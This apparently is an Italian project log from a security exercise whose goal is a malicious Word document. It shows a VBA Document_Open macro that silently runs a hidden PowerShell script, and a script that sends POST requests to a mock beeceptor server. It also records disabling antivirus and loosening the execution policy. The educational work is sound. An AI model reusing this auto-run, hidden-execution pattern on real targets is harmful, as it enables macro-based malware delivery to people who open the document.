Metasploit mette a disposizione `msfvenom` per la creazione di uno script vba che permette di ottenere una shell remota. Interessante ma il progetto chiede altro.
Tra l'altro l'antivirus individua IMMEDIATAMENTE il pericolo, per ora va disattivato.

> L’obiettivo di questo progetto è quello di realizzare un documento Word malevolo che contiene una macro VBA che all’apertura del documento esegue un comando Powershell.

Per adesso ho creato una macro che, all'apertura di un file word, esegue uno ~~script~~ powershell.

```vb
Sub ExecCommand()
	PID = Shell("powershell -noexit C:\Users\vboxuser\Desktop\req_script.ps1", vbHide)
End Sub

Sub Document_Open()
    ExecCommand
End Sub
```

Questo script invia delle richieste POST in maniera "silenziosa" (`vbHide`) ad un serverino di mockup creato su beeceptor.

```pw
for($i = 0; $i -lt 2; $i++) {
	Invoke-WebRequest -Uri https://mockup.free.beeceptor.com -Method POST
	Start-Sleep -Seconds 2
}
```

Per poter eseguire lo script ho dovuto impostare la seguente flag:
```vb
set-executionpolicy remotesigned
```

Sicuramente non dovrà essere abilitata tale flag, come l'antivirus dovrà essere acceso.